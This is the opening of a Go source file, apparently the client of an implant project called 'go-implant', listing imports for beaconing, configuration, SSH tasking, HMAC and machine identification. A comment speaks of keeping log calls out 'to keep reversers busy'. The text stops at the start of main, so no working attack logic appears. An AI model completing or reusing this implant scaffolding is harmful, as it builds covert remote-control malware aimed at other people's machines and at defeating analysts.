
/*
 *  and Fatalf's should be replaced with just os.exits - naw just remove them to keep reversers busy
 */

package main

import (
	"go-implant/client/beaconing"
	"go-implant/client/config"
	"go-implant/client/ssh"
	"go-implant/common/communication"
	"crypto/hmac"
	"crypto/sha256"
	"encoding/json"
	"fmt"
	"log"
	"math/rand"
	"os"
	"os/user"
	"runtime"
	"strconv"
	"time"

	"github.com/denisbrodbeck/machineid"
)

var taskchannels = []chan struct{}{} // channels for ssh tasks

func main() {